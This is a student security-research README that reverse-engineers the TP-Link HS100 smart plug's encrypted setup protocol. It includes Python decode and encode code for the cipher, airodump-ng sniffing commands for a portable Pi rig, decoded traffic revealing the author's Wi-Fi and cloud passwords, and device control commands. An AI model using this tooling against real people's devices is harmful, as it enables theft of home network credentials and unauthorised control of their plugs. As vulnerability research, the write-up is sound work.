# TP-Link HS100 Trojan Horse

This project was submitted as joint final project for my Security Lab (CS 460) and Independent Study (CS 397) at the University of Illinois Urbana - Champaign (UIUC). The intention of this project is to reverse engineer the function of a TP-Link Smart Wifi Plug (HS100) and utilize any findings.

Particularly, my goal for this project was to use the device as a trojan horse to recover credentials of the victim's home network. The victim would receive the device as a gift or prize from a "random" drawing. The adversary would then sniff network traffic during setup to obtain the Wi-Fi credentials. 

I was able to accomplish my primary goal, and obtained information which exceeded my initial expectations.

## Device Setup

Device setup is performed by the user with the Kasa smartphone app. The user is asked to create a TP-Link Cloud Account in order to control the smart plug from anywhere. If the user doesn't link a cloud account, the plug can only be controlled locally. Once the device is plugged in, it creates an open Wi-Fi network used for setup. Kasa then connects the user's smartphone to the plug's network and configures the device over Wi-Fi. 

I was able to capture this setup traffic using an Alfa AWUS036NH Wireless Adapter in monitor mode with airodump-ng. The only traffic was TCP traffic on port 9999. However, the transmitted data was not in plaintext. The application appears to encrypt or encode the TCP payload before transmission.

A port scan of the device showed 9999 as the only open port. 

## Attempted Reverse Engineering of Kasa

A copy of the latest Kasa APK was downloaded from   [APKMirror](https://www.apkmirror.com) and decompiled using [DEX2Jar](https://github.com/pxb1988/dex2jar). The resulting file was examined using [JD-GUI](https://github.com/java-decompiler/jd-gui) and [Luyten](https://github.com/deathmarine/Luyten). The goal was to isolate and analyze the section of the app that handled to device configuration in order to determine the encryption method.

Naturally, the decompiled Java code was void of any of the original variable and function names. After spending a few days looking through functions and variables whose names were one character letters I had made next to no progress making sense of the application. In the interest of time, I switched my focus to the network protocol.

## Reverse Engineering the Network Protocol

After capturing device setup traffic multiple times, I started to notice identical packets across different pcaps. This led me to try a known plaintext attack by varying the device alias passed during setup. The user is asked to pick a name for the plug, with a default value of "My Smart Plug". I captured another pcap of device setup traffic with the alias of "My Smart Slug" to test my hypothesis. 

## Known Plaintext Attack

 After painstackingly analyzing the TCP payload of the two captures, I was able to identify two packets with identical length and very similar structure. The differences between the two are highlighted in green and red below.

"My Smart Plug" Capture

```diff 
00:00:00:36:d0:f2:81:f8:8b:ff:9a:f7:d5:ef:94:b6:c5:
a0:d4:8b:ef:8a:fc:a3:c2:ae:c7:a6:d5:f7:cd:b6:94:f5:
99:f0:91:e2:c0:fa:d8:95:ec:cc:9f:f2:93:e1:95:b5:
+e5:89:fc:9b:b9:c4:b9:c4
```


"My Smart Slug" Capture

```diff 
00:00:00:36:d0:f2:81:f8:8b:ff:9a:f7:d5:ef:94:b6:c5:
a0:d4:8b:ef:8a:fc:a3:c2:ae:c7:a6:d5:f7:cd:b6:94:f5:
99:f0:91:e2:c0:fa:d8:95:ec:cc:9f:f2:93:e1:95:b5:
-e6:8a:ff:98:ba:c7:ba:c7
```

One can clearly pinpoint the byte where the differences start: e5 vs e6.
Given the two device strings differ only by one letter, I assumed e5 is likely 'P' and e6 is likely 'S'. In ASCII, 'P' is 0x50 and 'S' is 0x53.

If we XOR the plaintext and the ciphertext, we should recover one byte of the key used to encrypt the message originally.

 
```
0xe5 XOR 0x50 = 0xb5
0xe6 XOR 0x53 = 0xb5
```
  
In both cases, the key is the ciphertext of the preceding byte. If we continue this process for the adjacent bytes, we see the preceding character is a space, and the following character is a 'l'.
```
 0xb5 XOR 0x95 = 0x20	ASCII for ' '
 0x89 XOR 0xe5 = 0x6c	ASCII for 'l'
 0x8a XOR 0xe6 = 0x6c
```

Considering the aliases were "My Smart Plug" and "My Smart Slug", this decryption scheme is likely valid. Applying this method to the rest of the message, we are able to decrypt the entire command except for the first few bytes which are unprintable.

```
"system":{"set_dev_alias":{"alias":"My Smart Plug"}}}
```

Given that the structure of the command appears to be JSON, I assumed there should be one more '{' at the beginning of the string. Through some trial and error, the initial key was found to be 0xab (171 in decimal).

```
0xab XOR 0xd0 = 0x7c 	ASCII for '{'
```
I was not able to find what the first four bytes 00:00:00:36 were used for in this message.

## Decoding network traffic

With the decryption algorithm figured out, I was able to write a python script to decode the TCP packets. In order to avoid any ambiguity about mystery bytes at the beginning of the message, I decoded the string in reverse and added the beginning '{'.

```
def  decode(pkt):
	s =  str(pkt[TCP].payload)[::-1]
	ret =  ""
	for i in range(len(s)):
		if i +  1  <  len(s):
			c =  chr(ord(s[i]) ^  ord(s[i+1]))
			ret = c + ret
	begin = ret.find('\"')
	ret =  '{'  + ret[begin:]
	if ret.find('}') >  -1:
		print ret
	return ret
```
  
 
Utilizing the Scapy module, I was able to iterate through an entire packet capture and decode all of the smart plug's communication over TCP or UDP.

## Capturing setup traffic with a Raspberry Pi Zero W

  ![Image of Sniffer](https://i.imgur.com/8R2PgRk.jpg=250x)

### Parts
Raspberri Pi Zero W running Kali via [Re4son’s Pi-Tail](https://whitedome.com.au/re4son/pi-tail/)
Alfa AWUS036NH Wireless Adapter
External Battery Pack

### Configuration
Roughly 20s after receiving power, the Pi has booted and automatically logged in. Upon login, a bash script begins sniffing for HS100 networks used for device setup with the following startup script. This setup is capable of capturing continuous configuration traffic from multiple smart plugs, as long as the battery lasts.

```
airmon-ng start wlan1
airmon-ng check kill
airodump-ng wlan1mon -c 1 --essid-regex Plug -w scan_results
```
The provided ESSID capture filter matches all Wi-Fi networks with "Plug" in the ESSID. This will include all HS100 networks of the form TP-Link_Smart Plug_XXXX. While this filter could also capture extraneous networks, the regex filter can be furthered refined if necessary. 

Interestingly, the plugs only created setup networks on Channel 1 during my testing. This could be a universal default, or Channel 1 could be the least congested in my area. Regardless, sniffing a single channel was essential to capturing all packets during setup. If a single channel was not used, airodump-ng missed packets while channel hopping.


I encountered some issues with my antenna missing some packets, however the capture worked extremely well when the sniffer was between the smart plug and the smartphone. This problem could be mitigated with a better antenna, although battery life would suffer.


Below are the decoded commands from my best packet capture with this setup. Note: some duplicate information from retransmitted packets was removed using uniq.
```
{"system":{"get_sysinfo":{}}}
{"system":{"get_sysinfo":{"err_code":0,"sw_ver":"1.2.5 Build 171129 Rel.174814","hw_ver":"1.0","type":"IOT.SMARTPLUGSWITCH","model":"HS100(US)","mac":"50:C7:BF:5B:57:7E","deviceId":"8006CA44F6E7658EABC6D2CD45B6DB46186BDA47","hwId":"5EACBE93FB9E32ECBE1F1C2ADE6DDE11","fwId":"00000000000000000000000000000000","oemId":"37589AA1F5CACDC53E2914B7760127E5","alias":"TP-LINK_Smart Plug_577E","dev_name":"Wi-Fi Smart Plug","icon_hash":"","relay_state":1,"on_time":56,"active_mode":"none","feature":"TIM","updating":0,"led_off":0,"latitude":0,"longitude":0}}}
{"cnCloud":{"get_info":{}}}
{"cnCloud":{"get_info":{"username":"sschrock17@gmail.com","server":"devs.tplinkcloud.com","binded":0,"cld_connection":0,"illegalType":-1,"stopConnect":-1,"tcspStatus":-1,"fwDlPage":"","tcspInfo":"","fwNotifyType":0,"err_code":0}}}
{"time":{"set_timezone":{"hour":18,"index":13,"mday":1,"min":13,"month":5,"sec":49,"year":2018}}}
{"time":{"set_timezone":{"err_code":0}}}
{"system":{"set_dev_location":{"latitude":34.73994075,"latitude_i":347399,"longitude":-86.68234742,"longitude_i":-866823}}}
{"system":{"set_dev_location":{"err_code":0}}}
{"cnCloud":{"set_server_url":{"server":"devs.tplinkcloud.com"}}}
{"cnCloud":{"set_server_url":{"err_code":0}}}
{"cnCloud":{"set_sefserver_url":{"server":"deventry.tplinkcloud.com"}}}
{"cnCloud":{"set_sefserver_url":{"err_code":-2,"err_msg":"member not support"}}}
{"schedule":{"set_overall_enable":{"enable":1}}}
{"schedule":{"set_overall_enable":{"err_code":0}}}
{"time":{"set_timezone":{"index":13}}}
{"time":{"set_timezone":{"err_code":-3,"err_msg":"invalid argument"}}}
{"system":{"set_dev_location":{"latitude":34.73994075,"latitude_i":347399,"longitude":-86.68234742,"longitude_i":-866823}}}
{"system":{"set_dev_location":{"err_code":0}}}
{"system":{"set_dev_alias":{"alias":"Living Room Plug"}}}
{"system":{"set_dev_alias":{"err_code":0}}}
{"cnCloud":{"bind":{"password":"asupersecretpassword","username":"sschrock17@gmail.com"}}}
{"cnCloud":{"bind":{"err_code":-21,"err_msg":"can not connect to the server"}}}
{"netif":{"get_scaninfo":{"refresh":0}}}
{"netif":{"get_scaninfo":{"ap_list":[{"ssid":"2.4 1106STO-U2C","key_type":2},{"ssid":"Bankier-WiFi","key_type":0},{"ssid":"BunnyA","key_type":2},{"ssid":"CableWiFi","key_type":0},{"ssid":"GuessWhoIAm","key_type":3},{"ssid":"HCYHouse","key_type":3},{"ssid":"House wifi","key_type":3},{"ssid":"NETGEAR19","key_type":3},{"ssid":"NETGEAR88","key_type":3},{"ssid":"TP-Link_3B22","key_type":3},{"ssid":"TP-LINK_553E","key_type":2},{"ssid":"TP-LINK_56993C","key_type":2},{"ssid":"VIDEO","key_type":2},{"ssid":"Winternet is Coming","key_type":3},{"ssid":"XFINITY","key_type":3},{"ssid":"xfinitywifi","key_type":0},{"ssid":"xfinitywifi","key_type":0},{"ssid":"xfinitywifi","key_type":0}],"err_code":0}}}
{"netif":{"set_stainfo":{"key_type":3,"password":"fireandblood","ssid":"Winternet is Coming"}}}
{"netif":{"set_stainfo":{"mac":"50:C7:BF:5B:57:7E","err_code":0}}}
```

Note the following information:
```
{"cnCloud":{"bind":{"password":"asupersecretpassword","username":"sschrock17@gmail.com"}}}
{"netif":{"set_stainfo":{"key_type":3,"password":"fireandblood","ssid":"Winternet is Coming"}}}
```

The (temporary) credentials to my TP-Link Cloud Account and my Wi-Fi Network are easily recovered from capture. 

## Enumerating HS100 commands

 With the encryption algorithm known, I began capturing traffic related to functions available in the Kasa App. This process was painstaking because the plugs cannot be used on an open wifi network. I found this ironic, give that the device setup occurs over an open wifi network.
  
Therefore I had to use Wireshark to decrypt the WPA2 traffic for my network. As far as I know, there's no built in way to export this decrypted traffic, so I copy and pasted the TCP payloads into my script for decoding. The following list is non-exhaustive.

Get System Info 
```
{"system":{"get_sysinfo":{}}}
```

Reset the device
```
{"system":{"reset":{"delay":1}}}
```
Turn the plug on
```
{"system":{"set_relay_state":{"state":1}}}
```

Turn the plug off
```
{"system":{"set_relay_state":{"state":0}}}
```

Turn off the plug's LED (Night mode)
```
{"system":{"set_led_off":{"off":1}}}
```
Rename the device
```
{"system":{"set_dev_alias":{"alias":"New alias here"}}}
```


Get Cloud Info (Server, Username, Connection Status)
```
{"cnCloud":{"get_info":{}}}
```

Connect with new cloud account
```
{"cnCloud":{"bind":{"username":"email", "password":"pass"}}}
```
Disconnect device from the cloud
```
{"cnCloud":{"unbind":{}}}
```

Get current timer rule
```
{"count_down":{"get_rules":{}}}
```
Add a new timer, where delay is in seconds and act = 1 turns the device on, and act=0 turns the device off after timer expiration.
```
{"count_down":{"add_rule":{"enable":1,"delay":60,"act":1,"name":"rule name"}}}
```

Delete all timers (the device can only store a single timer)
```
{"count_down":{"delete_all_rules":{}}}
```
## Controlling the smart plugs programmatically

With the list of commands, and the encryption algorithm, it's possible to control the device outside of Kasa. This could be done maliciously after connecting to the victim's network with the leaked credentials, or it could be used to expand scripting functionality of the device for owners.

The encryption function is similar to the decryption function
```
def encode(msg):
	ret =  ""
	for i in  range(len(msg)):
		if i ==  0:
			ret +=  chr(ord(msg[i]) ^  171)
		else:
			ret +=  chr(ord(msg[i]) ^  ord(ret[i-1]))
	return ret
```

Commands can be sent over TCP or UDP. The benefit to sending over UDP is the broadcast address. It's possible to control all devices on the network using the broadcast address. If paired with the get_sysinfo command, this effectively enumerates all devices on the network.

## Running the code

### Prerequisites

The only dependency used is the scapy module. The module can be installed with pip

```
pip install scapy
```

### Installing
Clone or download the repository.

Edit send.<span></span>py to include the commands you wish to execute. Example commands are provided inside send.<span></span>py.

### Usage
The program is run with Python 2
```
python decode.py <pcap file>
python send.py
```

# Conclusion

The device setup information is encrypted using an [autokey cipher](https://en.wikipedia.org/wiki/Autokey_cipher). This cipher was broken with a known plaintext attack, which allowed for all configuration information to be decoded.
  
Included in this configuration information are the user's network and TP-Link Cloud credentials. This information can be easily captured with a portable Pi Zero W setup.

## Authors

*  **Spencer Schrock**